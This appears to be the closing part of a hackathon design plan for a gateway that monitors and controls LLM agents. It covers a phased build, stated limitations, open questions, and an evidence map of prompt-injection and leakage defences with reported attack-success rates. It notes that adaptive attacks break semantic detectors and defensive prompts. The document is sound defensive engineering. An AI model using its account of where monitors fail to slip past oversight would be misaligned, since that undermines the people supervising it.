| **2 Deterministic layer** | Identity + RBAC from groups; model allowlist and personalised `/v1/models`; budgets, rate limits, loop detection; PII/secrets with Polish validators; signature feed + feed server; egress/URL rules |
| **3 Tools & MCP** | MCP proxy (pinning, description scan, authorisation, result scanning); Rule-of-Two taint; approval queue; `/v1/decide`; governed tool server |
| **4 Clients** | OpenCode plugin (SSO, headers, tool checks) + managed config + locked-down container; LibreChat with OIDC → gateway |
| **5 Semantic layer & router** | Attack-similarity kNN; PII tiers T1/T2; L1 classifier (ONNX); L2 judges (alignment, contextual integrity, sanitise); graded risk scoring; shadow judge + calibration; caching, timeouts, fail modes, presets; task-scoped policy; sensitivity/complexity/specialist routing, budget-aware escalation, degraded local fallback |
| **6 Admin panel** | Posture, security stream + traces, incidents, approvals, policies (diff / dry-run), models, budgets, performance. Started in phase 2 and grown alongside |
| **7 Differentiators** | Artifact scanner (could move earlier: it's a formal requirement and cheap); Automation Insights minimal slice; fine-tuned PL model swap-in (parallel track from day 1); quarantine mode (stretch) |
| **8 Hardening** | Complete test corpora, mutation tests, strictness matrix, latency report, garak/promptfoo run, architecture diagram, demo rehearsal |

The test suite grows in every phase, not just in phase 8.

---

## 20. Risks and honest limitations

- **Semantic detection is bypassable** under adaptive attack. We say so, cite the research, and show where deterministic rules hold.
- **False positives.** Guards cut benign utility (e.g. 69%→41.5% on AgentDojo); we measure and show the FPR.
- **Small local models** are unreliable at multi-step tool calling. Demo tasks must be short and tested early on the demo hardware.
- **Local judge latency.** The judge runs on escalations only, with timeouts and fail modes.
- **Client-side controls can be tampered with.** That's why layers 1, 2 and 4 of §10 exist.
- **Streaming + redaction** adds complexity: buffer by sentence/window, `output_mode: buffer | stream_with_holdback`.
- **Licences:** Llama/Gemma model terms, fickling (LGPL), trufflehog (AGPL, so borrow ideas only), Open WebUI (custom licence, not used).
- **Moving standards:** OWASP MCP Top 10 is in beta, the OTel GenAI conventions are at "Development" status, the MCP spec moves quickly. Pin versions in code and docs.
- **Compliance:** EU AI Act / ISO 42001 / NIST features are "compliance-supporting", not compliance claims.

---

## 21. Open questions

1. Hackathon duration and team size. This decides whether Automation Insights and fine-tuning go into the build or only into the pitch.
2. Demo hardware (GPU/VRAM). This limits the guard, judge and coding model sizes.
3. WCSS access details (GPU type, queue times, data-transfer rules).
4. Whether LibreChat can forward per-user identity to a custom endpoint (per-user keys vs header placeholders). To verify.
5. OpenCode: exact `auth` hook signatures; whether a dynamic `models` list is possible.
6. Do we include A2A (agent-to-agent) or keep it as a stretch goal?
7. Which concrete Gemini model do we pin for the demo? (Decided later.)
8. Which specialist(s) do we fine-tune for the demo (loan memo only, or also a dev-side one)? Does a 4B base fit the demo GPU next to the general model and the guards?

---

## 22. References

- CRITERIA "AI Control Layer" challenge brief.
- `compass_artifact`: *AI Control Layer: Threat Landscape, State of the Art, and a Winning Build Plan (October 2026)*.
- `RESEARCH-REPORT.md`: systematic-review corpus synthesis; `[pid]` citations refer to papers in that report.
- OpenCode docs: [Config (precedence, managed settings, `enabled_providers`)](https://opencode.ai/docs/config/), [Plugins](https://opencode.ai/docs/plugins/), [plugin SDK hooks](https://raw.githubusercontent.com/sst/opencode/dev/packages/plugin/src/index.ts), [auth login / well-known issue #10939](https://github.com/anomalyco/opencode/issues/10939).
- Gemini API: [OpenAI compatibility](https://ai.google.dev/gemini-api/docs/openai), [terms](https://ai.google.dev/gemini-api/terms).
- SpeakLeash: [Bielik 11B v3.0 on Ollama](https://ollama.com/SpeakLeash/bielik-11b-v3.0-instruct), [Bielik 4.5B v3.0 GGUF](https://huggingface.co/speakleash/Bielik-4.5B-v3.0-Instruct-GGUF), [Bielik Guard 0.5B](https://huggingface.co/speakleash/Bielik-Guard-0.5B-v1.1), [Bielik Guard paper](https://huggingface.co/papers/2602.07954).
- OWASP Top 10 for LLM Applications 2026; OWASP Top 10 for Agentic Applications 2026; OWASP MCP Top 10 (beta); MITRE ATLAS; NIST AI 600-1.

---

## Appendix A. State-of-the-art evidence map

Each design element and the technique and evidence behind it. Most figures come from the research corpus (`[pid]` = paper in `RESEARCH-REPORT.md`); the rest come from the compass report. **Most results are from small or non-adaptive test sets**, so they are existence proofs, not guarantees. We present our own measured numbers instead of quoting these.

| Design element (section) | Technique / pattern | Evidence (reported effect) |
|---|---|---|
| Deterministic enforcement at the tool boundary (§9) | Policy Enforcement Point with IFC labels + hash-chained log | ASR 40%→5%, per-call FPR 4.6%, per-task FPR 30% [10632] |
| Privilege policies, monotonic confinement (§9) | Progent symbolic rules over tools and arguments | AgentDojo ASR 39.9%→1.0%; ASB 70.3%→3.9% [7540] |
| Task-scoped policy (§9) | Conseca (LLM writes the policy, code enforces it); IPIGuard tool graph; DRIFT | "Impervious to prompt injection" within the threat model [7556]; 13.16%→0.69% [3605]; 30.7%→1.4% [3444] |
| Rule of Two / taint (§9) | Lethal trifecta (Willison), Meta's Agents Rule of Two, SAMOS session taint | Blocks exfiltration even when detection fails [2944][10632] |
| Quarantine mode (§9, stretch) | CaMeL / Dual-LLM | 0 successful attacks at 77% utility [10631]; 25.6%→0% ASR [24321] |
| Tool tiers (§9) | deny / must / allow / confirm | Formally verified in Alloy [426] |
| MCP pinning and scanning (§9) | SHA-256 manifest pinning, namespace checks, description scan | 600/600 attacks blocked, no legitimate call rejected (non-adaptive) [300] |
| Agent identity (§9) | Attenuating capability tokens / token exchange | 91.3% ASR reduction, delegation-safety theorem [16701] |
| L1 + L2 cascade (§6) | Small classifier first, LLM check second (LlamaFirewall) | ASR 17.6%→7.5% (L1) →1.75% (combined) [23757] |
| Tool-call alignment judge (§6) | IntentGuard / Task Shield / AlignmentCheck | Task Shield 47.69%→2.07% [4476]; Qwen3-8B judge over 7,967 calls [752] |
| Sanitise tool results (§6) | PromptArmor detect-and-remove | 54.53%→0.00% ASR, FPR/FNR <1% (frontier judge) [23811] |
| Contextual-integrity check before sends (§6) | PrivacyChecker | Leakage 36.08%→7.30% [4114] |
| Graded decisions (§6.5) | IBBC-Guard five-factor risk score | ASR 1.000→0.000 at 14.2% overhead [32808] |
| Stacked PII tiers (§6) | Regex/validators → NER → local SLM | 97.3% vs 72.1% leak prevention for regex alone [1660] |
| Pseudonymise + allow-list restore (§6.3) | Policy-gated restoration | Naive restore leaked unauthorised values in 78.2% of cases; allow-list restore 0% [24126] |
| Route to local model (§6.3, §7) | PAPILLON / local-boundary middleware | Leakage 100→7.5 at −2.7 quality [4245]; 58.3% fewer external calls [305] |
| Scan tool outputs and DB results (§6, §9) | DB MCP connector ladder | Over-exposure 0.880→0.000 [14033] |
| Guard every channel (§6.1) | Redact internal channels too | Internal leakage 31.5%→2.4% [1749] |
| Budgets in the gateway (§8) | Hierarchical ledgers, loop/stagnation detection | Routers can't bound cumulative spend [30635]; runaway loops [4155] |
| Rule bands + small classifier for routing (§7) | Deterministic bands + local classifier | Learned routers fragile [44084]; −88% cost in one tiered system [398] |
| Server egress sandbox (§9) | Container egress allowlist | 100% of C2 connections blocked [398] |
| Audit and replay (§13, §16) | Hash-chained, versioned, replayable decisions; offline trace replay | [10632][32779]; LlamaFirewall offline evaluation [23757] |
| Evaluation design (§16) | AgentDojo-style pairs; code-independent oracles; mutation testing | [5742][14033]; PolicyFaultBench caught 7/12 mutants [32799] |

**Considered and not adopted (and why):**

| Technique | Why not |
|---|---|
| MELON (masked re-execution) [4368] | Roughly doubles inference per step; too expensive for an inline gateway on local hardware |
| Text / embedding differential privacy [5040][4338] | Utility collapses at meaningful ε; LLMs reconstruct DP-sanitised text [3916] |
| Split inference, secure computation [4895][8172] | Activations invertible; 73× slower |
| TEEs [3253] | Valid as a deployment option for the gateway (mention in the pitch); not needed for the build |
| Learned routers as the only router [4832] | Fragile and attackable [13313][44084]; we use rule bands + a classifier |
| The SLM's self-assessed confidence for sensitivity decisions [5] | Overconfident exactly where it matters; sensitivity comes from detectors |
| Spotlighting / defensive prompts as a primary defence | Broken by adaptive attacks (28%→99% ASR, compass report); kept only as a cheap extra layer |
| LLM Guard as a dependency | Archived (read-only) in July 2026; we borrow ideas only |
| LiteLLM as the gateway base | Backdoored PyPI releases in March 2026; enterprise-gated features; we own a lean core |

**Honest limits we state in the pitch:**
- Adaptive attacks break semantic detectors [6882][32776].
- No fixed policy blocks every contextual injection without blocking some legitimate flows [8470].
- Only the deterministic layer can be audited as a guarantee [426].

Our architecture is built around exactly these three facts.
